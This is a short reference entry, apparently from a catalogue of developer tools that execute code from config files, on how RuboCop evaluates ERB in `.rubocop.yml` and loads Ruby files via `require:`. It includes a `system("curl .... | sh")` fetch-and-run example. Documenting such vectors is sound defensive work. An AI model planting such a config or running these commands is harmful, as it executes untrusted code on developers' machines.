---
title: rubocop
tags:
- cli
- eval-sh
- config-file
references:
- https://docs.rubocop.org/rubocop/configuration.html#config-file-locations
files: ['.rubocop.yml']
purl: pkg:gem/rubocop
---

Rubocop is a Ruby linter and code formatter. Rubocop looks for a configuration file in the current working directory named `.rubocop.yml` and renders its content using [ERB](https://github.com/ruby/erb) which evalutes Ruby code contained inside `<%` and `%>` tags:

```erb
<% system("curl .... | sh") %>
```

Rubocop's configuration can also be used to evaluate other Ruby files:
```
require:
- ./file.rb
```
